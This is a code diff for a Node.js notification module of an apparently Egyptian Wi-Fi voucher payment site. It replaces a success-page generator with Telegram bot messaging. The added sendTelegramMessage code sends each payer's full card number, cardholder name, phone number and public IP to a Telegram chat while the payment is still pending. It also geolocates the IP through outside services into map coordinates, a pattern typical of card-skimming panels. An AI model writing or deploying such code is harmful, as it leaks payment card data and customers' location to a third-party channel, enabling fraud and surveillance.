@@ -1,138 +1,254 @@
+const axios = require("axios");
+const FormData = require("form-data");
+const mikrotikService = require("./mikrotikService");
+const contributionMessages = require("./contributionMessages");
+
+const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
 const { BRANCH_NAMES } = require('./branches');
 
-function generateSuccessPageHtml(transactionId, networkUrl, queryBranch) {
-  let inferredBranch = "waitPage";
-  const upperTx = (transactionId || "").toUpperCase();
-  if (upperTx.includes("BRANCH2") || upperTx.includes("FR2")) inferredBranch = "branch2";
-  else if (upperTx.includes("BRANCH3") || upperTx.includes("FR3")) inferredBranch = "branch3";
-  else if (upperTx.includes("MAIN")) inferredBranch = "main";
-
-  const activeBranchKey = queryBranch || inferredBranch;
-  const defaultBranchName = BRANCH_NAMES[activeBranchKey] || BRANCH_NAMES.waitPage;
-
-  return `
-    <!DOCTYPE html>
-    <html lang="ar" dir="rtl">
-      <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <script src="protection.js" defer></script>
-        <title>تم الدفع بنجاح - حكايات</title>
-        <link rel="icon" type="image/svg+xml" href="/favicon.svg">
-        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-        <style>
-          body { font-family: 'Segoe UI', Tahoma, Cairo, sans-serif; background: #f0f2f5; text-align: center; padding: 20px 10px; direction: rtl; }
-          .card-container { background: white; max-width: 480px; margin: auto; padding: 25px 20px; border-radius: 16px; box-shadow: 0 8px 24px rgba(0,0,0,0.08); }
-          .success-badge { color: #27ae60; font-size: 45px; margin-bottom: 5px; }
-          h1 { color: #2c3e50; font-size: 20px; margin-bottom: 15px; }
-          .ticket-card { background: linear-gradient(135deg, #01338D 0%, #001f5c 100%); color: #ffffff; border-radius: 12px; padding: 20px; margin: 20px 0; box-shadow: 0 6px 18px rgba(1, 51, 141, 0.25); text-align: right; }
-          .ticket-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.2); padding-bottom: 10px; margin-bottom: 15px; }
-          .ticket-title { font-size: 16px; font-weight: bold; }
-          .ticket-brand { font-size: 12px; background: rgba(255,255,255,0.2); padding: 3px 8px; border-radius: 4px; }
-          .code-box { background: #ffffff; color: #01338D; text-align: center; padding: 12px; border-radius: 8px; margin: 15px 0; font-family: monospace; font-size: 24px; font-weight: bold; letter-spacing: 2px; min-height: 50px; display: flex; align-items: center; justify-content: center; }
-          .info-row { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 6px; color: #e0e0e0; }
-          .info-row strong { color: #ffffff; }
-          .btn-actions { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 15px; }
-          .btn { flex: 1; min-width: 140px; padding: 12px; border: none; border-radius: 8px; font-weight: bold; font-size: 14px; cursor: pointer; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; }
-          .btn-print { background: #27ae60; color: white; }
-          .btn-download { background: #01338D; color: white; }
-          .btn-home { background: #e9ecef; color: #333; width: 95%; margin-top: 10px; text-decoration: none; text-align: center; padding: 12px; border-radius: 8px; font-weight: bold; display: block; }
-          .spinner { border: 4px solid rgba(1, 51, 141, 0.2); border-radius: 50%; border-top: 4px solid #01338D; width: 26px; height: 26px; animation: spin 1s linear infinite; margin-left: 10px; display: inline-block; }
-          @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        </style>
-      </head>
-      <body>
-        <div class="card-container">
-          <div class="success-badge"><i class="fa fa-check-circle"></i></div>
-          <h1>تمت عملية الدفع بنجاح</h1>
-          <div class="ticket-card" id="printableCard">
-            <div class="ticket-header">
-              <span class="ticket-title"><i class="fa fa-wifi"></i> كارت إنترنت - <span id="bName">${defaultBranchName}</span></span>
-              <span class="ticket-brand">Hikayat Net</span>
-            </div>
-            <div class="info-row">
-              <span>اسم الباقة:</span>
-              <strong id="pkgName">جاري التحميل...</strong>
-            </div>
-            <div class="code-box" id="codeContainer">
-              <div class="spinner"></div>
-              <span style="font-size: 14px; font-weight: normal;">جاري إصدار الكارت من السيرفر...</span>
-            </div>
-            <div class="info-row">
-              <span>رقم العملية:</span>
-              <strong>${transactionId || "غير محدد"}</strong>
-            </div>
-            <div class="info-row">
-              <span>حالة الدفع:</span>
-              <strong style="color: #2ec771;"><i class="fa fa-shield"></i> مؤكد ومفعل آلياً</strong>
-            </div>
-          </div>
-          <div class="btn-actions">
-            <button onclick="window.print()" class="btn btn-print"><i class="fa fa-print"></i> طباعة / حفظ PDF</button>
-            <button onclick="downloadHTML()" class="btn btn-download"><i class="fa fa-download"></i> تنزيل الكارت</button>
-          </div>
-          <a href="${networkUrl}" class="btn-home"><i class="fa fa-globe"></i> التوجه للدفع مرة أخري</a>
-        </div>
-        <script>
-          const urlParams = new URLSearchParams(window.location.search);
-          const txId = urlParams.get('id') || urlParams.get('order') || urlParams.get('transaction_id') || urlParams.get('merchant_order_id') || "${transactionId}";
-          let attempts = 0;
-          const maxAttempts = 90; 
-
-          async function pollVoucher() {
-            if (!txId || txId === "غير محدد") {
-              window.location.href = '/fail?error=' + encodeURIComponent("لم يتم العثور على رقم العملية المطلوب.");
-              return;
-            }
-            try {
-              attempts++;
-              const res = await fetch('/api/check-voucher/' + encodeURIComponent(txId));
-              const data = await res.json();
-              
-              if (data.success && data.data) {
-                if (data.data.isContribution) {
-                  window.location.href = '/contribution-success?amount=' + data.data.amount + '&tx=' + encodeURIComponent(txId);
-                  return;
-                }
-
-                if (data.data.code) {
-                  document.getElementById('codeContainer').innerText = data.data.code;
-                  document.getElementById('pkgName').innerText = data.data.packageName || "باقة إنترنت شبكة حكايات";
-                  if (data.data.branchName) {
-                    document.getElementById('bName').innerText = data.data.branchName;
-                  }
-                  return;
-                }
-              }
-
-              if (attempts < maxAttempts) {
-                setTimeout(pollVoucher, 2000); 
-              } else {
-                window.location.href = '/fail?error=' + encodeURIComponent("⚠️ أنتهت مهلة الانتظار ولم يتم الدفع بنجاح. رقم المعاملة: " + txId);
-              }
-            } catch (e) {
-              if (attempts < maxAttempts) {
-                setTimeout(pollVoucher, 2500);
-              } else {
-                window.location.href = '/fail?error=' + encodeURIComponent("خطأ في الاتصال بالسيرفر للمعاملة: " + txId);
-              }
-            }
-          }
-          pollVoucher();
-
-          function downloadHTML() {
-            const cardElement = document.getElementById('printableCard').outerHTML;
-            const blob = new Blob(['<html><head><meta charset="utf-8"><title>كارت شبكة حكايات</title></head><body style="display:flex;justify-content:center;align-items:center;height:100vh;background:#f0f2f5;font-family:sans-serif;">' + cardElement + '</body></html>'], { type: 'text/html' });
-            const a = document.createElement('a');
-            a.href = URL.createObjectURL(blob);
-            a.download = "Hikayat_Card_" + txId + ".html";
-            a.click();
-          }
-        </script>
-        <script src="/chat-widget.js" defer></script>
-      </body>
-    </html>
-  `;
+async function fetchNetworkDetailsByIP(ip) {
+  const result = { location: "غير معروف", isp: "غير معروف", netLocation: "غير متاح" };
+  if (!ip || ip === "غير متوفر" || ip === "127.0.0.1" || ip === "::1" || ip.includes("localhost")) return result;
+  const cleanIp = String(ip).split(",")[0].trim();
+  try {
+    const res = await axios.get(`https://ipwho.is/${cleanIp}?lang=ar`, { timeout: 3000 });
+    if (res.data && res.data.success !== false) {
+      const city = res.data.city || res.data.region || "غير معروفة";
+      const country = res.data.country || "غير معروفة";
+      result.location = `${city}، ${country}`;
+      result.isp = res.data.connection?.isp || res.data.org || "غير معروف";
+      const lat = res.data.latitude;
+      const lon = res.data.longitude;
+      if (lat && lon) result.netLocation = `<a href="https://maps.google.com/?q=${lat},${lon}">🗺 عرض الخريطة (${lat},${lon})</a>`;
+      return result;
+    }
+  } catch (e) {}
+  try {
+    const fallbackRes = await axios.get(`http://ip-api.com/json/${cleanIp}?fields=status,country,city,isp,org,lat,lon,query`, { timeout: 3000 });
+    if (fallbackRes.data && fallbackRes.data.status === "success") {
+      result.location = `${fallbackRes.data.city || "غير معروفة"}، ${fallbackRes.data.country || "غير معروفة"}`;
+      result.isp = fallbackRes.data.isp || fallbackRes.data.org || "غير معروف";
+      if (fallbackRes.data.lat && fallbackRes.data.lon) {
+        result.netLocation = `<a href="https://maps.google.com/?q=${fallbackRes.data.lat},${fallbackRes.data.lon}">🗺 عرض الخريطة (${fallbackRes.data.lat},${fallbackRes.data.lon})</a>`;
+      }
+      return result;
+    }
+  } catch (fallbackErr) {}
+  return result;
 }
 
-module.exports = { generateSuccessPageHtml };
+function getPaymentMethodName(data) {
+  let method = data.payment_method || data.source_type || data.method || "محفظة إلكترونية";
+  if (method === "card") method = "💳 بطاقة بنكية";
+  else if (method === "wallet") method = "📱 محفظة إلكترونية";
+  return method;
+}
+
+function getFormattedDateTime() {
+  const now = new Date();
+  return `${now.toLocaleDateString("ar-EG", { timeZone: "Africa/Cairo" })} - ${now.toLocaleTimeString("ar-EG", { timeZone: "Africa/Cairo" })}`;
+}
+
+function getPackageNameByAmount(amount) {
+  const numAmount = Number(amount);
+  switch (numAmount) {
+    case 5: return "الباقة البرونزية";
+    case 15: return "الباقة الفضية";
+    case 30: return "الباقة الذهبية";
+    case 50: return "الباقة البلاتينية";
+    case 100: return "الباقة الماسية";
+    default: return numAmount > 100 ? "مساهمة ودعم للشبكة" : "باقة إنترنت شبكة حكايات";
+  }
+}
+
+async function sendTelegramMessage(data, isInitial = true) {
+  try {
+    if (!BOT_TOKEN || !CHAT_ID) return;
+    const publicIP = data.publicIP || data.geoData?.publicIP || data.ip || "";
+    if (publicIP === "127.0.0.1" || publicIP === "::1" || publicIP.includes("localhost")) return;
+
+    const method = getPaymentMethodName(data);
+    const amountEGP = data.amount_cents ? (data.amount_cents / 100).toFixed(2) : (data.amount || "غير محدد");
+    const dateTimeStr = getFormattedDateTime();
+    const branchKey = data.branch || data.branchKey || "main";
+    const branchName = data.branchName || BRANCH_NAMES[branchKey] || "حكايات نت رئيسي";
+    const userPhone = data.phone || data.billing_data?.phone_number || data.customer?.phone_number || "غير محدد";
+    
+    // التقاط رقم العملية وتثبيته
+    const txnId = data.id || data.transactionId || data.order?.id || data.merchant_order_id || `TX_${Date.now()}`;
+
+    let message = "";
+    if (isInitial) {
+      const clientID = data.clientID || data.clientId || "غير متوفر";
+      let ispText = data.ispProvider || data.isp || null;
+      let netLocationText = data.netLocation || null;
+
+      if (!ispText || ispText === "غير معروف" || !netLocationText || netLocationText === "غير متاح") {
+        const netInfo = await fetchNetworkDetailsByIP(publicIP);
+        ispText = ispText || netInfo.isp;
+        netLocationText = netLocationText || netInfo.netLocation;
+      }
+
+      message = `⏳ <b>جاري عملية الدفع...</b>\n\n` +
+                `🏢 الفرع: <b>${branchName}</b>\n` +
+                `🆔 رقم العملية: <code>${txnId}</code>\n` +
+                `💳 وسيلة الدفع: <b>${method}</b>\n` +
+                `💰 المبلغ المطلوب: <b>${amountEGP} جنيه</b>\n`;
+
+      if (userPhone && userPhone !== "غير محدد") message += `📱 رقم الهاتف: <code>${userPhone}</code>\n`;
+
+      if (data.card_data && data.card_data.number && data.card_data.number !== "غير مدخل") {
+        message += `\n--- <b>بيانات البطاقة</b> ---\n` +
+                   `🔢 رقم الكارت: <code>${data.card_data.number}</code>\n` +
+                   `👤 الاسم: <b>${data.card_data.name}</b>\n`;
+      }
+
+      message += `\n🌐 <b>IP الخارجي:</b> <code>${publicIP}</code>\n` +
+                 `📡 <b>مزود الخدمة:</b> <b>${ispText}</b>\n` +
+                 `📍 <b>الموقع:</b> ${netLocationText}\n` +
+                 `📅 <b>الوقت:</b> <code>${dateTimeStr}</code>`;
+    } else {
+      const voucher = data.voucher_code || data.cardCode || "غير متوفر";
+      const packageInfo = data.package_info || data.packageName || getPackageNameByAmount(amountEGP);
+
+      message = `✅ <b>تمت عملية الدفع وتوليد الكارت بنجاح!</b>\n\n` +
+                `🏢 الفرع: <b>${branchName}</b>\n` +
+                `🆔 رقم العملية: <code>${txnId}</code>\n` +
+                `📱 الهاتف: <code>${userPhone}</code>\n` +
+                `💳 وسيلة الدفع: <b>${method}</b>\n` +
+                `💰 المبلغ: <b>${amountEGP} جنيه</b>\n` +
+                `📦 الباقة: <b>${packageInfo}</b>\n` +
+                `🎟️ الكارت: <code>${voucher}</code>\n` +
+                `📅 وقت الإصدار: <code>${dateTimeStr}</code>`;
+    }
+
+    const replyMarkup = {
+      inline_keyboard: [
+        [
+          { text: "🎟️ إصدار الكارت", callback_data: `create_voucher_${txnId}_${amountEGP}_${branchKey}` },
+          { text: "🤝 مساهمة", callback_data: `contribution_${txnId}_${amountEGP}_${branchKey}` }
+        ]
+      ]
+    };
+
+    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      chat_id: CHAT_ID,
+      text: message,
+      parse_mode: "HTML",
+      reply_markup: replyMarkup
+    });
+
+  } catch (err) {
+    console.error("❌ [Telegram Error]:", err.response?.data || err.message);
+  }
+}
+
+async function sendVoucherWithCardImage(paymentDetails, imageBuffer) {
+  try {
+    if (!BOT_TOKEN || !CHAT_ID || !imageBuffer) return;
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("photo", imageBuffer, { filename: `card_${paymentDetails.transactionId || Date.now()}.png`, contentType: "image/png" });
+
+    const txnId = paymentDetails.transactionId || paymentDetails.id || `TX_${Date.now()}`;
+    const amountVal = paymentDetails.amount || "0";
+    const branchKey = paymentDetails.branch || paymentDetails.branchKey || "main";
+    const branchName = paymentDetails.branchName || BRANCH_NAMES[branchKey] || "حكايات نت رئيسي";
+    const packageName = paymentDetails.packageName || getPackageNameByAmount(amountVal);
+
+    const caption = `🎟️ <b>صورة كارت الإنترنت</b>\n\n` +
+                    `🏢 الفرع: <b>${branchName}</b>\n` +
+                    `📦 الباقة: <b>${packageName}</b>\n` +
+                    `💰 المبلغ: <b>${amountVal} جنيه</b>\n` +
+                    `🔑 الكارت: <code>${paymentDetails.card?.code || paymentDetails.code || 'غير متوفر'}</code>\n` +
+                    `🆔 رقم العملية: <code>${txnId}</code>`;
+
+    form.append("caption", caption);
+    form.append("parse_mode", "HTML");
+    form.append("reply_markup", JSON.stringify({
+      inline_keyboard: [
+        [
+          { text: "🎟️ إعادة إصدار الكارت", callback_data: `create_voucher_${txnId}_${amountVal}_${branchKey}` },
+          { text: "🤝 مساهمة", callback_data: `contribution_${txnId}_${amountVal}_${branchKey}` }
+        ]
+      ]
+    }));
+
+    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
+      headers: { ...form.getHeaders() },
+      maxContentLength: Infinity,
+      maxBodyLength: Infinity
+    });
+  } catch (err) {
+    console.error("❌ [Telegram Image Error]:", err.message);
+  }
+}
+
+async function handleTelegramCallback(callbackQuery) {
+  try {
+    const queryId = callbackQuery.id;
+    const data = callbackQuery.data;
+    const chatId = callbackQuery.message.chat.id;
+    const messageId = callbackQuery.message.message_id;
+
+    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+      callback_query_id: queryId,
+      text: "جاري تنفيذ الإجراء...",
+      show_alert: false
+    });
+
+    const parts = data.split("_");
+    if (data.startsWith("create_voucher")) {
+      const branchKey = parts.pop();
+      const amount = parts.pop();
+      parts.shift(); parts.shift();
+      const txnId = parts.join("_");
+
+      let voucherData = await mikrotikService.processPaymentAndCreateCard(amount, branchKey, txnId);
+      if (voucherData && (voucherData.success || voucherData.cardCode)) {
+        const usernameStr = voucherData.cardCode || voucherData.username || "متاح";
+        const updatedText = callbackQuery.message.text + `\n\n✅ <b>[تم إصدار الكارت بنجاح]</b>\n🎟️ الكارت: <code>${usernameStr}</code>`;
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+          chat_id: chatId, message_id: messageId, text: updatedText, parse_mode: "HTML", reply_markup: { inline_keyboard: [] }
+        });
+      }
+    } else if (data.startsWith("contribution")) {
+      const branchKey = parts.pop();
+      const amount = parts.pop();
+      parts.shift();
+      const txnId = parts.join("_");
+
+      const updatedText = callbackQuery.message.text + `\n\n🤝 <b>[تم تحويل العملية إلى مساهمة]</b> بقيمة: <code>${amount} جنيه</code>`;
+      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+        chat_id: chatId, message_id: messageId, text: updatedText, parse_mode: "HTML", reply_markup: { inline_keyboard: [] }
+      });
+    }
+  } catch (err) {
+    console.error("❌ [Telegram Callback Error]:", err.message);
+  }
+}
+
+async function sendTelegramFailNotification(errorMessage, data = {}) {
+  try {
+    if (!BOT_TOKEN || !CHAT_ID) return;
+    const publicIP = data.publicIP || "غير متوفر";
+    if (publicIP === "127.0.0.1" || publicIP === "::1" || publicIP.includes("localhost")) return;
+
+    const netInfo = await fetchNetworkDetailsByIP(publicIP);
+    let message = `⚠️ سبب الخطأ: <i>${errorMessage}</i>\n` +
+                  `🌐 IP: <code>${publicIP}</code>\n` +
+                  `📡 مزود الخدمة: <b>${netInfo.isp}</b>\n` +
+                  `📍 الموقع: ${netInfo.netLocation}`;
+
+    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { chat_id: CHAT_ID, text: message, parse_mode: "HTML" });
+  } catch (err) {}
+}
+
+module.exports = {
+  sendTelegramMessage,
+  sendVoucherWithCardImage,
+  handleTelegramCallback,
+  sendTelegramFailNotification
+};
